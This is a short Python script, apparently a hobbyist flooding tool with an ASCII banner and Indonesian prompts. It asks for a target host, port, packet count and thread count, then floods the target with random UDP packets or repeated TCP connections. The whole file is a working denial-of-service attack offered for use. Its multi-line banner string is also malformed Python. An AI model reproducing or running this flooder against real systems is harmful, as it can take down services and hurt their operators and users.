#!/usr/bin/env python3
import random
import socket
import threading

print ("
██████╗░██╗░░░██╗██╗░░░██╗██╗░░░██╗
██╔══██╗╚██╗░██╔╝██║░░░██║██║░░░██║
██████╔╝░╚████╔╝░██║░░░██║██║░░░██║
██╔══██╗░░╚██╔╝░░██║░░░██║██║░░░██║
██║░░██║░░░██║░░░╚██████╔╝╚██████╔╝
╚═╝░░╚═╝░░░╚═╝░░░░╚═════╝░░╚═════╝░")                                                                     

print       (" >> TOOLS CREATED BY XRYUU <<")
print       (" >> NOT ABUSE << ")
print       (">> NOT RENAME <<")                                   
print       (" >> PM GW BUAT BERTANYA <<")
print       (" >> XD COMMUNITY<<")
print       (" >> TOOLS REMAKE RYUU <<")
    
ip = str(input("  HOST/IP:"))
port = int(input(" Port:"))
choice = str(input(" Mau Gass?(y/n):"))
times = int(input(" Paket:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XRyuu ATTACKED THE SERVER")
		except:
			print("[!] SERVER EROR")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XRyuu ATTACKED THE SERVER ")
		except:
			s.close()
			print("[*] SERVER EROR")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()